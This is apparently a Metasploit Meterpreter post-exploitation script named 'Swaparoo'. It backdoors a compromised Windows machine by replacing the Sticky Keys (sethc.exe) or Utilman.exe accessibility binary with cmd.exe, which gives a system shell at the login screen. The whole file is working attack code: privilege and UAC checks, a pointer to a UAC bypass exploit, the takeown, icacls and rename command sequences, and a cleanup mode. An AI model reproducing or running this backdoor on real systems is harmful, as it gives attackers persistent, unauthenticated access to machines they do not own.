# $Id:swaparoo.rb $ 
# $Revision: 01 $
# Meterpreter Swaparoo - Windows Backdoor Method (all Windows versions)
# Authors: Un0wn_X & Hood3dRob1n

################## Variable Declarations ##################
session = client #Our victim session object we will work with
#Basic Arguments user can provide when running meterpreter script
@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false,"Help menu." ],
	"-u" => [ false, "Use Utilman.exe (Sethc.exe used by default)" ],
	"-p" => [ false,"Path on target to find Sethc.exe or Utilman.exe (default is %SYSTEMROOT%\\\\system32\\\\)" ],
	"-r" => [ false,"Remove payload & Return original back to its place (use with -u for Utilman.exe cleanup)" ]
)

################## Function Declarations ##################
#Usage
def usage
	print_line("Windows Swaparoo - Sneaks a Backdoor Command Shell in place of Sticky Keys Prompt or Utilman assistant at Login Screen (requires admin privs)")
	print_line(@@exec_opts.usage)
	raise Rex::Script::Completed
end

#check for proper Meterpreter Platform
def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

#check for proper privileges are in place to run the tasks (i.e. are we admin?)
def notadmin
	print_error("You need admin privs to run this!")
	print_error("Try using 'getsystem' or one of the many escalation scripts and try again.......")
	raise Rex::Script::Completed
end

#Execute our list of command needed to achieve the backdooring (sethc.exe vs Utilman.exe) or cleanup tasks :p
def list_exec(session, cmdlst) #session is our meter sessions, cmdlst is our array of commands to run on target
	r=''
	session.response_timeout=120
	cmdlst.each do |cmd|
		begin
			print_status("Executing: #{cmd}")
			r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
			while(d = r.channel.read)
				break if d == ""
			end
			r.channel.close
			r.close
		rescue ::Exception => e
			print_error("Error Running Command #{cmd}: #{e.class} #{e}")
		end
	end
end

# check if UAC is enabled (the builtin for privs isn't workign for me for somereason so I made a new version), idk.....
def uac_enabled
	#Confirm target could have UAC, then find out level its running at if possible
	if session.sys.config.sysinfo['OS'] !~ /Windows Vista|Windows 2008|Windows [78]/
			uac = false
	else
		begin
			key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',KEY_READ)
			if key.query_value('EnableLUA').data == 1
				uac = true
				print_status("UAC is Enabled, checking level...")
#				key.close
				uac_level = key.query_value('ConsentPromptBehaviorAdmin').data 
				if uac_level.to_i == 2
					print_error("UAC is set to 'Always Notify'")
					print_error("Things won't work under these conditions.....")
					raise Rex::Script::Completed
				elsif uac_level.to_i == 5
					print_error("UAC is set to Default")
					print_error("You should try running 'exploit/windows/local/bypassuac' to bypass UAC restrictions if you haven't already")
				elsif uac_level.to_i == 0
					print_good("UAC Settings Don't appear to be an issue...")
					uac = false
				else
					print_status("Unknown UAC Setting, if it doesn't work try things manually to see if UAC is blocking......")
					uac = false
				end
			end
			key.close
		rescue::Exception => e
			print_error("Error Checking UAC: #{e.class} #{e}")
		end
	end
	return uac
end

##################### MAIN ######################
# Parse our user provided options and run post script accordingly....
sysroot = session.fs.file.expand_path("%SYSTEMROOT%") #now we can get base path for different versions of Windows
path = "#{sysroot}\\\\system32\\\\" #twice is nice (must escape properly for dir dividers
targetexe = 0
helpcall = 0
remove = 0
@@exec_opts.parse(args) do |opt, idx, val|
	case opt
		when "-h"
			helpcall = 1	#Help Menu
		when "-u"
			targetexe = 1	#0=> Sethc.exe, 1=>Utilman.exe
		when "-p"
			path = val	#override default path
		when "-r"
			remove = 1 	#Run cleanup
	end
end
#Make sure we were passed proper arguments to run
if helpcall == 1
	usage
end
#we only can do this on windows :p
unsupported if not session.platform =~ /win/i

#Make sure we are admin
if session.railgun.shell32.IsUserAnAdmin()['return']
	print_good("Confirmed, currently running as admin.....")
else
	notadmin
end

#Check if UAC is enabled and potentially going to cause us problems on newer systems
if uac_enabled
	print_error("Can't run this on target system without bypassing UAC first!")
	print_status("Please make sure you have already done this or script will not work......")
	print_status("")
else
	print_good("Confirmed, UAC is not an issue!")
end

#Arrays with our commands we need to accomplish stuff:
sethc = [ "takeown /f #{path}sethc.exe", 
	  "icacls #{path}sethc.exe /grant administrators:f", 
	  "rename #{path}sethc.exe  sethc.exe.bak", 
	  "copy #{path}cmd.exe #{path}cmd3.exe", 
	  "rename #{path}cmd3.exe sethc.exe" ]

utilman = [ "takeown /f #{path}Utilman.exe", 
	    "icacls #{path}Utilman.exe /grant administrators:f", 
	    "rename #{path}Utilman.exe  Utilman.exe.bak", 
	    "copy #{path}cmd.exe #{path}cmd3.exe", 
	    "rename #{path}cmd3.exe Utilman.exe" ]

sethc_cleanup = [ "takeown /f #{path}sethc.exe", 
		  "icacls #{path}sethc.exe /grant administrators:f",
		  "takeown /f #{path}sethc.exe.bak", 
		  "icacls #{path}sethc.exe.bak /grant Administrators:f",
		  "del #{path}sethc.exe", 
		  "rename #{path}sethc.exe.bak sethc.exe" ]

utilman_cleanup = [ "takeown /f #{path}Utilman.exe", 
		    "icacls #{path}Utilman.exe /grant administrators:f",
		    "takeown /f #{path}utilman.exe.bak", 
		    "icacls #{path}utilman.exe.bak /grant Administrators:f", 
		    "del #{path}Utilman.exe", 
	            "rename #{path}Utilman.exe.bak Utilman.exe" ]

#Check if we running in cleanup mode or backdoor mode, act accordingly
if remove.to_i > 0
	print_status("Starting the Swaparoo cleanup process.....")
	#Check if using Utilman method or standard Sethc method
	if targetexe.to_i > 0
		list_exec(session, utilman_cleanup)
	else
		list_exec(session, sethc_cleanup)
	end
else
	#Check for signs of previous backdooring, if so this can overwrite the backup file which means you can't cleanup afterwards! Bail out if found as a result and have user remove, rename, or run cleanup to make it ok.....
	print_status("Starting the Swaparoo backdooring process.....")
	if targetexe.to_i > 0
		if session.fs.file.exists?("#{path}utilman.exe.bak")
			print_error("Target appears to have already been backdoored!")
			print_error("Delete or rename the backup file (sethc.exe.bak or utilman.exe.bak) manually or run the -r option for running cleanup tasks.....")
			raise Rex::Script::Completed
		else
			list_exec(session, utilman)
		end
	else
		if session.fs.file.exists?("#{path}sethc.exe.bak")
			print_error("Target appears to have already been backdoored!")
			print_error("Delete or rename the backup file (sethc.exe.bak or utilman.exe.bak) manually or run the -r option for running cleanup tasks.....")
			raise Rex::Script::Completed
		else
			list_exec(session, sethc)
		end
	end
end
print_status("Finished Swaparoo!")
if remove.to_i > 0
	print_good("System should be restored back to normal!")
else
	if targetexe.to_i > 0
		print_good("Press the Windows key + U or Click on the Blue Help icon at lower left on Login Screen and you should be greeted by a shell!")
	else
		print_good("Press Shift key 5 times at Login Screen and you should be greeted by a shell!")
	end
end
